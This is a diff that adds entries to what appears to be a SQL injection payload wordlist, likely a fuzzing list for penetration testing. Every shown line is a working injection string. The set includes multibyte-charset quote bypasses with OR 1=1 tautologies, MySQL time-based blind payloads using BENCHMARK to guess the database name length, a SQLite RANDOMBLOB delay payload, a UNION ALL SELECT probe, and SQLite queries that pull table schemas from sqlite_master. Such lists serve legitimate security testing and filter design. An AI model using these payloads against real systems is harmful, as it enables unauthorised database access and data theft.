@@ -923,7 +923,18 @@ root' OR 1=1
 "oR/**/true/*
 "oR/*/2/*/oR"
 "||"2"="2"||"
-%A8%27||1-- 2
+%A8%27||1--
+%A8%27 OR 1=1
+%A8%27 OR 1=1;
+%A8%27 OR 1=1;--
+%A8%27 OR 1=1--
+%8C%A8%27 OR 1=1
+%8C%A8%27 OR 1=1 -- -
+%8C%A8%27 OR 1=1--
+%8C%A8%27 OR 1=1 --
+%bf' or 1=1 -- --
+%bf' or 1=1
+%bf' or 1=1 --
 %bf%27 OR 1=1
 %bf' Or 1-- 2
 %bf'Or(1)-- 2
@@ -7870,3 +7881,15 @@ seLEct rEplACE(rEpLACE(REPLAce(rePlAce(rePLACe(Replace(rEplAce(Replace(REPlACE(R
 ' or SEleCT repLACE(rEPLAce(rePlACE(REpLace(rEPlacE(rEplAcE(replacE(repLacE(REPLACe(REpLACe(SUbStr((suBstR(SQL,iNSTR(SQL,'(')%2B1)),instr((SuBsTR(SqL,InstR(sQL,'(')%2b1)),'')),"text",''),"InTEGeR",''),"AuToIncreMEnt",''),"PRiMary kEy",''),"uNiqUE",''),"nuMEric",''),"ReAl",''),"BLOB",''),"noT NULL",''),",",'~~') frOm sQlITE_MASter whErE TYpe!='mEta' and sQL nOt nULl and NAMe NoT lIKE 'sQliTE_%' aND nAmE ='tABlE_nAme'
 ' aNd selEcT rEplAce(rEplACE(rEplacE(repLaCe(RepLaCE(RepLacE(rEPlACe(replacE(REplacE(RePLacE(suBstR((SuBStR(SqL,iNsTR(sQL,'(')%2b1)),iNstR((SuBStR(sqL,INsTr(sql,'(')%2b1)),'')),"TeXt",''),"INteger",''),"auTOiNCremenT",''),"PRiMARY key",''),"uNIQUE",''),"NumErIC",''),"rEAl",''),"blOB",''),"NOT nUll",''),",",'~~') FrOM sqliTe_MasTer WHeRe type!='Meta' aNd sqL NOT nUlL anD naME NOT liKE 'SQlITE_%' and naMe ='tABle_NaME'
 ' AND SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=1, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=2, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=3, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=4, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=5, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=6, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=7, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=8, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=9, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838, IF(length(database())=10, (BENCHMARK(50000000,MD5(0x746b7170))), 0)),1)--
+1) AND 3513=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND (5992=5992
+-7232) UNION ALL SELECT CHAR(113,120,113,112,113)||CHAR(82,102,110,107,86,116,70,103,101,98,73,82,120,71,88,82,66,75,100,86,76,108,72,104,88,102,115,102,117,111,121,71,73,87,75,100,107,77,73,71)||CHAR(113,113,120,112,113),NULL,NULL-- TQmS
